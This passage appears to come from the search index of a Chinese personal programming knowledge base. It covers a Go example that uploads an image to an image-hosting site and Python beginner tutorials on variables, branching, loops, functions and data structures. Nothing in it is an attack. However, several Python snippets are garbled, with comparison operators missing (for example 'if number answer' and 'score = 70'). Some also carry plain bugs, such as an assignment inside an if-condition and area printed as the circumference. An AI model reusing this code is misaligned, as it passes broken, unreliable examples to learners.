`\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } /* 获取上传图片需要的token */ func getToken() string { u := \"https://imgtu.com/\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") resp, _ := client.Do(req) res,_ := ioutil.ReadAll(resp.Body) regex, _ := regexp.Compile(\"PF.obj.config.auth_token = \\\"(.*?)\\\";\") if regex.MatchString(string(res)){ token := regex.FindStringSubmatch(string(res))[1] return token } return \"\" } /* 构造上传请求 */ func imgkr(token string, imgFilePath string) *http.Request { // 上传网址 target := \"https://imgtu.com/json\" // 要上传的文件 file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"type\", \"file\") _ = bodyWriter.WriteField(\"action\", \"upload\") _ = bodyWriter.WriteField(\"timestamp\", fmt.Sprintf(\"%d\", time.Now().UnixNano()/1e6)) _ = bodyWriter.WriteField(\"auth_token\", token) _ = bodyWriter.WriteField(\"nsfw\", \"0\") // 自动补充boundary结尾 _ = bodyWriter.Close() //fmt.Println(bodyBuff) //构建的完整数据包，没有header // 创建请求 req, _ := http.NewRequest(\"POST\", target, bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") return req } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} token := getToken() req := imgkr(token, \"/Users/d4m1ts/d4m1ts/Upload/logo.png\") resp, _ := client.Do(req) res, _ := ioutil.ReadAll(resp.Body) imageUrl := jsoniter.Get(res, \"image\").Get(\"url\") fmt.Println(imageUrl.ToString()) } 效果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:49 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/06.使用GO上传图片.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/01.变量和类型.html":{"url":"知识库/04.编程开发/02.Python/01.变量和类型.html","title":"01.变量和类型","keywords":"","body":" 变量命名 变量的使用 运算符 练习 Windows Python2.7 编码解决 变量和类型 在程序设计中，变量是一种存储数据的载体。计算机中的变量是实际存在的数据或者是存储器中存储数据的一块内存空间，变量的值可以被读取和修改，这是所有计算和控制的基础。计算机能处理的数据有很多类型，除了数值之外还可以处理文本、图形，音频，视频等各种各样的数据，那么不同的数据就需要定义不同的存储类型。Python中的数据类型很多，而且也允许我们自定义新的数据类型。 整形： Python中可以处理任意大小的整数（Python 2.x中有 int和long两种类型的整数，但这种区分对Python来说意义不大，因此在Python 3.x中整数只有int这一种了），而且支持二进制（如0b100，换算成十进制是4）、八进制（如0o100，换算成十进制是64）、十进制（100）和十六进制（0x100，换算成十进制是256）的表示法。 浮点型： 浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，浮点数除了数学写法（如123.456）之外还支持科学计数法（如1.23456e2）。 字符串型： 字符串是以单引号或双引号括起来的任意文本，比如'hello'和\"hello\",字符串还有原始字符串表示法、字节字符串表示法、Unicode字符串表示法，而且可以书写成多行的形式（用三个单引号或三个双引号开头，三个单引号或三个双引号结尾）。 布尔型：布尔值只有True、False两种值，要么是True，要么是False，在Python中，可以直接用True、False表示布尔值（请注意大小写），也可以通过布尔运算计算出来（例如3 会产生布尔值True，而2 == 1会产生布尔值False） 复数型：形如3+5j，跟数学上的复数表示一样，唯一不同的是虚部的i换成了j。 变量命名 对于每个变量我们需要给它取一个名字，就如同我们每个人都有属于自己的响亮的名字一样。在Python中，变量命名需要遵循以下这些必须遵守硬性规则和强烈建议遵守的非硬性规则。 硬性规则： 变量名有字母（广义的Unicode字符，不包含特殊字符）、数字和下划线构成，数字不能开头 大小写敏感 不要跟关键字（有特殊含义的单词）和系统保留字（如函数、模块等的名字）冲突 PE 8 要求 用小写字母拼写，多个单词用下划线连接 受保护的实例属性用单个下划线开头 私有的实例属性用两个下划线开头 变量的使用 a = 321 b = 123 print(a+b) print(a-b) print (a*b) print(a/b) print(a//b) print(a % b) print(a**b) a = int(input('a=')) b = int(input('b=')) print('%d + %d = %d' % (a, b, a+b)) print('%d - %d = %d' % (a, b, a-b)) print('%d * %d = %d' % (a, b, a*b)) print('%d / %d = %.2f' % (a, b, a/b)) print('%d // %d = %d' % (a, b, a//b)) print('%d %% %d = %d' % (a, b, a % b)) print('%d ** %d = %d' % (a, b, a**b)) a = 100 b = 'aaaa' c = 5 + 76j d = 123.34 e = True print(type(a)) print(type(b)) print(type(c)) print(type(d)) print(type(e)) 在对变量类型进行转换时可以使用Python的内置函数（准确的说下面列出的并不是真正意义上的函数，而是后面我们要讲到的创建对象的构造方法）。 int()：将一个数值或字符串转换成整数，可以指定进制。 float()：将一个字符串转换成浮点数。 str()：将指定的对象转换成字符串形式，可以指定编码。 chr()：将整数转换成该编码对应的字符串（一个字符）。 ord()：将字符串（一个字符）转换成对应的编码（整数）。 运算符 Python支持多种运算符，下表大致按照优先级从高到低的顺序列出了所有的运算符，我们会陆续使用到它们。 运算符 描述 [] [:] 下标，切片 ** 指数 ~ + - 按位取反, 正负号 * / % // 乘，除，模，整除 + - 加，减 >> 右移，左移 & 按位与 ^ ` ` > >= 小于等于，小于，大于，大于等于 == != 等于，不等于 is is not 身份运算符 in not in 成员运算符 not or and 逻辑运算符 = += -= *= /= %= //= **= &= ` =`^= >>= 练习 # -*- coding:utf-8 -*- ''' @Description: null @Version: 1.0 @Autor: AaronLuo @Date: 2020-01-29 18:45:29 @LastEditors : AaronLuo @LastEditTime : 2020-01-29 20:06:10 ''' # 输入华摄度转摄氏度 # F = 1.8C + 32 def gbkChange(str): return str.decode('utf-8').encode('gbk') f = float(input(gbkChange('请输入华摄度:\\t1'))) C = (f-32)/1.8 print(gbkChange('%.2f华摄度 = %.2f摄氏度' % (f, C))) import math def gbkChange(str): return str.decode('utf-8').encode('gbk') # 输入圆的半径计算计算周长和面积 # S = πR^2 # C = 2πR r = float(input(gbkChange('请输入半径:\\t'))) s = math.pi * r * r c = math.pi * r * 2 print(gbkChange('周长为：%.2f,面积为：%.2f' % (s, c))) # 输入年份判断闰平年 def gbkChange(str): return str.decode('utf-8').encode('gbk') # 输入年份判断闰平年 year = int(input(gbkChange('请输入年份:'))) if(year % 4 == 0 and year % 100 != 0 or year % 400 == 0): print(gbkChange('%d年是闰年' % year)) else: print(gbkChange('%d年是平年' % year)) Windows Python2.7 编码解决 # -*- coding:utf-8 -*- # unicode 先解码为utf-8,再编码为windows可识别的gbk def gbkChange(str): return str.decode('utf-8').encode('gbk') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-02-08 18:55:22 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/01.变量和类型.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/02-分支结构.html":{"url":"知识库/04.编程开发/02.Python/02-分支结构.html","title":"02-分支结构","keywords":"","body":" 分支结构的应用场景 if语句的使用 demo demo_1 练习 练习1：英制单位与公制单位互换 练习2：掷骰子决定做什么 练习3：百分制成绩转等级制 练习4：输入三条边长如果能构成三角形就计算周长和面积 分支结构 分支结构的应用场景 迄今为止，我们写的Python代码都是一条一条语句顺序执行，这种结构的代码我们称之为顺序结构。然而仅有顺序结构并不能解决所有的问题，比如我们设计一个游戏，游戏第一关的通关条件是玩家获得1000分，那么在完成本局游戏后我们要根据玩家得到分数来决定究竟是进入第二关还是告诉玩家“Game Over”，这里就会产生两个分支，而且这两个分支只有一个会被执行，这就是程序中分支结构。 if语句的使用 在Python中，要构造分支结构可以使用if、elif和else关键字。所谓关键字就是有特殊含义的单词，像if和else就是专门用于构造分支结构的关键字，很显然你不能够使用它作为变量名（事实上，用作其他的标识符也是不可以） demo username = input('请输入用户名:') password = input('请输入密码:') if username == 'admin' and password = '123456': print('身份验证成功') else: print('身份验证失败') 唯一需要说明的是和C/C++、Java等语言不同，Python中没有用花括号来构造代码块而是使用了缩进的方式来设置代码的层次结构，如果if条件成立的情况下需要执行多条语句，只要保持多条语句具有相同的缩进就可以了，换句话说连续的代码如果又保持了相同的缩进那么它们属于同一个代码块，相当于是一个执行的整体。 当然如果要构造出更多的分支，可以使用if…elif…else…结构，例如下面的分段函数求值 demo_1 \"\"\" 3x - 5 (x > 1) f(x) = x + 2 (-1 1: y = 3 * x - 5 elif x >= -1 and x 当然根据实际开发的需要，分支结构是可以嵌套的，例如判断是否通关以后还要根据你获得的宝物或者道具的数量对你的表现给出等级（比如点亮两颗或三颗星星），那么我们就需要在if的内部构造出一个新的分支结构，同理elif和else中也可以再构造新的分支，我们称之为嵌套的分支结构，也就是说上面的代码也可以写成下面的样子 \"\"\" 3x - 5 (x > 1) f(x) = x + 2 (-1 1: y = 3 * x - 5 else: if x >= -1: y = x + 2 else: y = 5 * x + 3 print ('f(%.2f) = %.2f' % (x, y)) 练习 练习1：英制单位与公制单位互换 def gbkChange(str): return str.decode('utf-8').encode('gbk') def utfChange(str): return str.decode('gbk').encode('utf-8') value = float(input(gbkChange('请输入长度'))) unit = utfChange(raw_input(gbkChange('请输入单位:'))) if unit == 'in' or unit == '英寸': print(gbkChange('%f英寸 = %f厘米' % (value, value*2.54))) elif unit == 'cm' or unit == '厘米': print(gbkChange('%f厘米 = %f英寸' % (value, value/2.54))) else: print(gbkChange('请输入有效单位')) 练习2：掷骰子决定做什么 from random import randint x = randint(1, 6) if x == 1: print 1 elif x == 2: print 2 elif x == 3: print 3 elif x == 4: print 4 elif x == 5: print 5 elif x == 6: print 6 练习3：百分制成绩转等级制 \"\"\" 百分制成绩转等级制成绩 90分以上 --> A 80分~89分 --> B 70分~79分 --> C 60分~69分 --> D 60分以下 --> E \"\"\" score = float(input(gbkChange('请输入成绩:'))) if score >= 90: x = 'A' elif score >= 80 and score = 70 and score = 60 and score 练习4：输入三条边长如果能构成三角形就计算周长和面积 import math a = float(input('a=')) b = float(input('b=')) c = float(input('c=')) if a + b > c and a + c > b and b + c > a: C = a + b + c area = math.sqrt(C / 2 * (C / 2 - a) * (C / 2 - b) * (C / 2 - c)) print(gbkChange('周长为%.2f,面积为%.2f' % (C, area))) else: print(gbkChange('无法构成三角形')) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-02-08 19:00:10 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/02-分支结构.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/03-循环结构.html":{"url":"知识库/04.编程开发/02.Python/03-循环结构.html","title":"03-循环结构","keywords":"","body":" 循环结构的应用场景 for - in循环 while循环 练习 练习1：判断一个数是否为素数 练习2：输入两个正整数，计算最大公约数和最小公倍数 循环结构 循环结构的应用场景 如果在程序中我们需要重复的执行某条或某些指令，例如用程序控制机器人踢足球，如果机器人持球而且还没有进入射门范围，那么我们就要一直发出让机器人向球门方向奔跑的指令。当然你可能已经注意到了，刚才的描述中其实不仅仅有需要重复的动作，还有我们上一个章节讲到的分支结构。再举一个简单的例子，比如在我们的程序中要实现每隔1秒中在屏幕上打印一个\"hello, world\"这样的字符串并持续一个小时，我们肯定不能够将print('hello, world')这句代码写上3600遍，如果真的需要这样做那么编程的工作就太无聊了。因此，我们需要了解一下循环结构，有了循环结构我们就可以轻松的控制某件事或者某些事重复、重复、再重复的发生。在Python中构造循环结构有两种做法，一种是for-in循环，一种是while循环。 for - in循环 如果明确的知道循环执行的次数或者是要对一个容器进行迭代（后面会讲到），那么我们推荐使用for-in循环 \"\"\" 用for循环实现1~100求和 \"\"\" sum = 0 for x in range(101): sum += x print(sum) 需要说明的是上面代码中的range类型，range可以用来产生一个不变的数值序列，而且这个序列通常都是用在循环中的，例如： range(101)可以产生一个0到100的整数序列。 range(1, 100)可以产生一个1到99的整数序列。 range(1, 100, 2)可以产生一个1到99的奇数序列，其中的2是步长，即数值序列的增量。 实现1~100之间的偶数求和 sum = 0 for x in range(2, 101, 2): sum += x print(sum) 通过在循环中使用分支结构的方式来实现相同的功能，代码如下所示 sum = 0 for x in range(1, 101): if x % 2 == 0: sum += x print(sum) while循环 如果要构造不知道具体循环次数的循环结构，我们推荐使用while循环，while循环通过一个能够产生或转换出bool值的表达式来控制循环，表达式的值为True循环继续，表达式的值为False循环结束。下面我们通过一个“猜数字”的小游戏（计算机出一个1~100之间的随机数，人输入自己猜的数字，计算机给出对应的提示信息，直到人猜出计算机出的数字）来看看如何使用while循环。 \"\"\" 猜数字游戏 计算机出一个1~100之间的随机数由人来猜 计算机根据人猜的数字分别给出提示大一点/小一点/猜对了 \"\"\" import random answer = random.randint(1, 100) counter = 0 while True: counter += 1 number = int(input('input: ')) if number answer: print('smaller') else: print('yes!') break print('all guess %d ' % counter) if counter > 7: print('sb') 说明：上面的代码中使用了break关键字来提前终止循环，需要注意的是break只能终止它所在的那个循环，这一点在使用嵌套的循环结构（下面会讲到）需要引起注意。除了break之外，还有另一个关键字是continue，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。 与分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个九九乘法表。 for i in range(1, 10): for j in range(1, i+1): print('%d * %d = %d\\n' % (i, j, i*j)) 练习 练习1：判断一个数是否为素数 import math num = int(input('input:')) end = int(math.sqrt(num)) is_Prime = True for i in range(2, end+1): if(num % i == 0): is_Prime = False break if is_Prime and num != 1: print('yes!') else: print('no!') 练习2：输入两个正整数，计算最大公约数和最小公倍数 x = int(input('x = ')) y = int(input('y = ')) if x > y: x, y = y, x for i in range(x, 0, -1): if x % i == 0 and y % i == 0: print('%d,%d big num = %d' % (x, y, i)) print('%d,%d small num = %d' % (x, y, x*y//i)) break Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-18 20:25:44 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/03-循环结构.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/04-函数与模块.html":{"url":"知识库/04.编程开发/02.Python/04-函数与模块.html","title":"04-函数与模块","keywords":"","body":" 函数的作用 定义函数 函数的参数 用模块管理函数 练习 练习1：实现计算求最大公约数和最小公倍数的函数 练习2：实现判断一个数是不是回文数的函数 练习3：实现判断一个数是不是素数的函数 练习4：写一个程序判断输入的正整数是不是回文素数 函数与模块 先研究一道数学题，请说出下面的方程有多少组正整数解。 $$x_1 + x_2 + x_3 + x_4 = 8$$ 事实上，上面的问题等同于将8个苹果分成四组每组至少一个苹果有多少种方 解题思路：将8个苹果分成四组，每一组至少有一个，那么就是有7个空位中间插入3个隔板，C(7,3) m = int(input('m = ')) n = int(input('n = ')) fm = 1 for num in range(1, m + 1): fm *= num fn = 1 for num in range(1, n + 1): fn *= num fmn = 1 for num in range(1, m - n + 1): fmn *= num print(fm // fn // fmn) 函数的作用 不知道大家是否注意到，在上面的代码中，我们做了3次求阶乘，这样的代码实际上就是重复代码。编程大师Martin Fowler先生曾经说过：“代码有很多种坏味道，重复是最坏的一种！”，要写出高质量的代码首先要解决的就是重复代码的问题。对于上面的代码来说，我们可以将计算阶乘的功能封装到一个称之为“函数”的功能模块中，在需要计算阶乘的地方，我们只需要“调用”这个“函数”就可以了。 定义函数 在Python中可以使用def关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过return关键字来返回一个值，这相当于数学上说的函数的因变量 在了解了如何定义函数后，我们可以对上面的代码进行重构，所谓重构就是在不影响代码执行结果的前提下对代码的结构进行调整，重构之后的代码如下所示 def factorial(num): if num == 1: return num else: return num * factorial(num - 1) 函数的参数 函数是绝大多数编程语言中都支持的一个代码的“构建块”，但是Python中的函数与其他语言中的函数还是有很多不太相同的地方，其中一个显著的区别就是Python对函数参数的处理。在Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持函数的重载，因为我们在定义一个函数的时候可以让它有多种不同的使用方式，下面是两个小例子。 import random as x def roll_dice(n=2): total = 0 for _ in range(n): total += x.randint(1, 6) return total def add(a=0, b=0, c=0): return a+b+c print roll_dice(3) print roll_dice() print add(1, 2, 3) print add() 我们给上面两个函数的参数都设定了默认值，这也就意味着如果在调用函数的时候如果没有传入对应参数的值时将使用该参数的默认值，所以在上面的代码中我们可以用各种不同的方式去调用add函数，这跟其他很多语言中函数重载的效果是一致的。 其实上面的add函数还有更好的实现方案，因为我们可能会对0个或多个参数进行加法运算，而具体有多少个参数是由调用者来决定，我们作为函数的设计者对这一点是一无所知的，因此在不确定参数个数的时候，我们可以使用可变参数，代码如下所示。 def add(*args): total = 0 for val in args: total += val return total 用模块管理函数 对于任何一种编程语言来说，给变量、函数这样的标识符起名字都是一个让人头疼的问题，因为我们会遇到命名冲突这种尴尬的情况。最简单的场景就是在同一个.py文件中定义了两个同名函数，由于Python没有函数重载的概念，那么后面的定义会覆盖之前的定义，也就意味着两个函数同名函数实际上只有一个是存在的。 def foo(): print('hello, world!') def foo(): print('goodbye, world!') # 下面的代码会输出什么呢？ foo() # goodbye, world! 当然上面的这种情况我们很容易就能避免，但是如果项目是由多人协作进行团队开发的时候，团队中可能有多个程序员都定义了名为foo的函数，那么怎么解决这种命名冲突呢？答案其实很简单，Python中每个文件就代表了一个模块（module），我们在不同的模块中可以有同名的函数，在使用函数的时候我们通过import关键字导入指定的模块就可以区分到底要使用的是哪个模块中的foo函数，代码如下所示 module1.py def foo(): print('hello, world!') module2.py def foo(): print('goodbye, world!') test.py from module1 import foo # 输出hello, world! foo() from module2 import foo # 输出goodbye, world! foo() 也可以按照如下所示的方式来区分到底要使用哪一个foo函数。 test.py import module1 as m1 import module2 as m2 m1.foo() m2.foo() 但是如果将代码写成了下面的样子，那么程序中调用的是最后导入的那个foo，因为后导入的foo覆盖了之前导入的foo。 test.py from module1 import foo from module2 import foo # 输出goodbye, world! foo() test.py from module2 import foo from module1 import foo # 输出hello, world! foo() 需要说明的是，如果我们导入的模块除了定义函数之外还中有可以执行代码，那么Python解释器在导入这个模块时就会执行这些代码，事实上我们可能并不希望如此，因此如果我们在模块中编写了执行代码，最好是将这些执行代码放入如下所示的条件中，这样的话除非直接运行该模块，if条件下的这些代码是不会执行的，因为只有直接执行的模块的名字才是“main”。 module3.py def foo(): print 'hello world' def bar(): print 'pass' # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == '__main__': print('call foo()') foo() print('call bar()') bar() test.py import module3 # 导入module3时 不会执行模块中if条件成立时的代码 因为模块的名字是module3而不是__main__ 练习 练习1：实现计算求最大公约数和最小公倍数的函数 def gcd(x, y): # (x, y) = (y, x) if x > y else (x, y) (x, y) = [(y, x), (x, y)][x 练习2：实现判断一个数是不是回文数的函数 def is_palindrome(num): temp = num total = 0 while temp > 0: total = total * 10 + temp % 10 temp //= 10 return total == num 练习3：实现判断一个数是不是素数的函数 def is_prime(num): for factor in range(2, num): if num % factor == 0: return False # return True if num != 1 else False return [True,False][num == 1] 练习4：写一个程序判断输入的正整数是不是回文素数 if __name__ == '__main__': num = int(input('num = ')) if is_prime(num) and is_palindrome(num): print True else: print False 通过上面的程序可以看出，当我们将代码中重复出现的和相对独立的功能抽取成函数后，我们可以组合使用这些函数来解决更为复杂的问题，这也是我们为什么要定义和使用函数的一个非常重要的原因。 最后，我们来讨论一下Python中有关变量作用域的问题 def foo(): b = 'hello' def bar(): # Python中可以在函数内部再定义函数 c = True print(a) print(b) print(c) bar() # print(c) # NameError: name 'c' is not defined if __name__ == '__main__': a = 100 # print(b) # NameError: name 'b' is not defined foo() 上面的代码能够顺利的执行并且打印出100和“hello”，但我们注意到了，在bar函数的内部并没有定义a和b两个变量，那么a和b是从哪里来的。我们在上面代码的if分支中定义了一个变量a，这是一个全局变量（global variable），属于全局作用域，因为它没有定义在任何一个函数中。在上面的foo函数中我们定义了变量b，这是一个定义在函数中的局部变量（local variable），属于局部作用域，在foo函数的外部并不能访问到它；但对于foo函数内部的bar函数来说，变量b属于嵌套作用域，在bar函数中我们是可以访问到它的。bar函数中的变量c属于局部作用域，在bar函数之外是无法访问的。事实上，Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索，前三者我们在上面的代码中已经看到了，所谓的“内置作用域”就是Python内置的那些隐含标识符min、len等都属于内置作用域）。 再看看下面这段代码，我们希望通过函数调用修改全局变量a的值，但实际上下面的代码是做不到的。 def foo(): a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 100 在调用foo函数后，我们发现a的值仍然是100，这是因为当我们在函数foo中写a = 200的时候，是重新定义了一个名字为a的局部变量，它跟全局作用域的a并不是同一个变量，因为局部作用域中有了自己的变量a，因此foo函数不再搜索全局作用域中的a。如果我们希望在foo函数中修改全局作用域中的a，代码如下所示。 def foo(): global a a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 200 我们可以使用global关键字来指示foo函数中的变量a来自于全局作用域，如果全局作用域中没有a，那么下面一行的代码就会定义变量a并将其置于全局作用域。同理，如果我们希望函数内部的函数能够修改嵌套作用域中的变量，可以使用nonlocal关键字来指示变量来自于嵌套作用域，请大家自行试验。 在实际开发中，我们应该尽量减少对全局变量的使用，因为全局变量的作用域和影响过于广泛，可能会发生意料之外的修改和使用，除此之外全局变量比局部变量拥有更长的生命周期，可能导致对象占用的内存长时间无法被垃圾回收)。事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。减少全局变量的使用就意味着我们应该尽量让变量的作用域在函数的内部，但是如果我们希望将一个局部变量的生命周期延长，使其在函数调用结束后依然可以访问，这时候就需要使用闭包)，这个我们在后续的内容中进行讲解。 def foo(b): def bar(a): return a+b return bar if __name__ == '__main__': print(foo(100)(200)) #300 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-02-09 17:30:04 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/04-函数与模块.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/05-字符串和常用数据结构.html":{"url":"知识库/04.编程开发/02.Python/05-字符串和常用数据结构.html","title":"05-字符串和常用数据结构","keywords":"","body":" 使用字符串 使用列表 使用元组 使用集合 使用字典 练习 练习1：在屏幕上显示跑马灯文字 练习2：设计一个函数产生指定长度的验证码，验证码由大小写字母和数字构成 练习3：设计一个函数返回给定文件名的后缀名 练习4：设计一个函数返回传入的列表中最大和第二大的元素的值 练习5:打印杨辉三角 练习6: 约瑟夫环问题 字符串和常用数据结构 使用字符串 第二次世界大战促使了现代电子计算机的诞生，当初的想法很简单，就是用计算机来计算导弹的弹道，因此在计算机刚刚诞生的那个年代，计算机处理的信息主要是数值，而世界上的第一台电子计算机ENIAC每秒钟能够完成约5000次浮点运算。随着时间的推移，虽然对数值运算仍然是计算机日常工作中最为重要的事情之一，但是今天的计算机处理得更多的数据都是以文本信息的方式存在的，而Python表示文本信息的方式我们在很早以前就说过了，那就是字符串类型。所谓字符串，就是由零个或多个字符组成的有限序列，a{1}a{2}....a{n} def main(): str1 = 'hello world' print(len(str1)) # 计算长度 print(str1.capitalize()) # 首字符大写拷贝 print(str1.upper()) # 所有字符大写拷贝 print(str1.lower()) # 所有字符小写拷贝 print(str1.find('or')) # 查找子串位置 print(str1.find('shit')) # print(str1.index('or')) # 与find类似，找不到抛出错误 # print(str1.index('shit')) print(str1.startswith('He')) # 查找字符串开头是否以子串开头 print(str1.startswith('he')) print(str1.endswith('d')) # 查找字符串结尾是否以子串开头 print(str1.endswith('D')) print(str1.center(50, '*')) # 将字符串以指定的宽度居中并在两侧填充指定的字符 print(str1.rjust(50, '*')) # 将字符串以指定的宽度靠右放置左侧填充指定的字符 print(str1.ljust(50, '*')) # 将字符串以指定的宽度靠左放置左侧填充指定的字符 # 从字符串中取出指定位置的字符(下标运算) str2 = 'abcdefg123456' print(str2[2]) # c print(str2[2:5]) # cde print(str2[2:]) # cdefg123456 print(str2[2::2]) # ceg246 print(str2[::2]) # aceg246 print(str2[::-1]) # 654321gfedcba print(str2[-3:-1]) # 45 print(str2.isdigit()) # 检查字符串是否全由数字构成 print(str2.isalpha()) # 检查字符串是否全由字母构成 print(str2.isalnum()) # 检查字符串是否由数字+字母构成 str3 = ' hello world ' print(str3.strip()) # 去除字符串左右的多余空格拷贝 if __name__ == '__main__': main() 除了字符串，Python还内置了多种类型的数据结构，如果要在程序中保存和操作数据，绝大多数时候可以利用现有的数据结构来实现，最常用的包括列表、元组、集合和字典 使用列表 下面的代码演示了如何定义列表、使用下标访问列表元素以及添加和删除元素的操作。 def main(): list1 = [1, 3, 5, 7, 100] print(list1) list2 = ['hello'] * 5 print(list2) # 计算列表长度(元素个数) print(len(list1)) # 下标(索引)运算 print(list1[0]) print(list1[4]) # print(list1[5]) # IndexError: list index out of range print(list1[-1]) print(list1[-3]) list1[2] = 300 print(list1) # 添加元素 list1.append(200) list1.insert(1, 400) list1 += [1000, 2000] print(list1) print(len(list1)) # 删除元素 list1.remove(3) if 1234 in list1: list1.remove(1234) del list1[0] print(list1) # 清空列表元素 list1.clear() print(list1) if __name__ == '__main__': main() 下面的代码实现了对列表的排序操作。 def main(): list1 = ['orange', 'apple', 'zoo', 'internationalization', 'blueberry'] list2 = sorted(list1) # sorted函数返回列表排序后的拷贝不会修改传入的列表 # 函数的设计就应该像sorted函数一样尽可能不产生副作用 list3 = sorted(list1, reverse=True) # 通过key关键字参数指定根据字符串长度进行排序而不是默认的字母表顺序 list4 = sorted(list1, key=len) print(list1) print(list2) print(list3) print(list4) # 给列表对象发出排序消息直接在列表对象上进行排序 list1.sort(reverse=True) print(list1) if __name__ == '__main__': main() 我们还可以使用列表的生成式语法来创建列表，代码如下所示。 import sys def main(): f = [x for x in range(1, 10)] print(f) f = [x + y for x in 'ABCDE' for y in '1234567'] print(f) # 用列表的生成表达式语法创建列表容器 # 用这种语法创建列表之后元素已经准备就绪所以需要耗费较多的内存空间 f = [x ** 2 for x in range(1, 1000)] print(sys.getsizeof(f)) # 查看对象占用内存的字节数 print(f) # 请注意下面的代码创建的不是一个列表而是一个生成器对象 # 通过生成器可以获取到数据但它不占用额外的空间存储数据 # 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间) f = (x ** 2 for x in range(1, 1000)) print(sys.getsizeof(f)) # 相比生成式生成器不占用存储数据的空间 print(f) for val in f: print(val) if __name__ == '__main__': main() 除了上面提到的生成器语法，Python中还有另外一种定义生成器的方式，就是通过yield关键字将一个普通函数改造成生成器函数。下面的代码演示了如何实现一个生成斐波拉切数列的生成器。所谓斐波拉切数列可以通过下面递归的方法来进行定义： def fib(n): a, b = 0, 1 for _ in range(n): a, b = b, a + b yield a def main(): for val in fib(20): print(val) if __name__ == '__main__': main() 使用元组 Python 的元组与列表类似，不同之处在于元组的元素不能修改，在前面的代码中我们已经不止一次使用过元组了。顾名思义，我们把多个元素组合到一起就形成了一个元组，所以它和列表一样可以保存多条数据。下面的代码演示了如何定义和使用元组。 def main(): # 定义元组 t = ('aaron', 22, True, '四川') print(t) # 获取元组中的元素 print(t[0]) print(t[3]) # 遍历元组中的值 for member in t: print(member) # 重新给元组赋值 # t[0] = '王大锤' # TypeError # 变量t重新引用了新的元组原来的元组将被垃圾回收 t = ('王大锤', 20, True, '云南昆明') print(t) # 将元组转换成列表 person = list(t) print(person) # 列表是可以修改它的元素的 person[0] = '李小龙' person[1] = 25 print(person) # 将列表转换成元组 fruits_list = ['apple', 'banana', 'orange'] fruits_tuple = tuple(fruits_list) print(fruits_tuple) if __name__ == '__main__': main() 这里有一个非常值得探讨的问题，我们已经有了列表这种数据结构，为什么还需要元组这样的类型呢？ 元组中的元素是无法修改的，事实上我们在项目中尤其是多线程环境（后面会讲到）中可能更喜欢使用的是那些不变对象（一方面因为对象状态不能修改，所以可以避免由此引起的不必要的程序错误，简单的说就是一个不变的对象要比可变的对象更加容易维护；另一方面因为没有任何一个线程能够修改不变对象的内部状态，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。一个不变对象可以方便的被共享访问）。所以结论就是：如果不需要对元素进行添加、删除、修改的时候，可以考虑使用元组，当然如果一个方法要返回多个值，使用元组也是不错的选择。 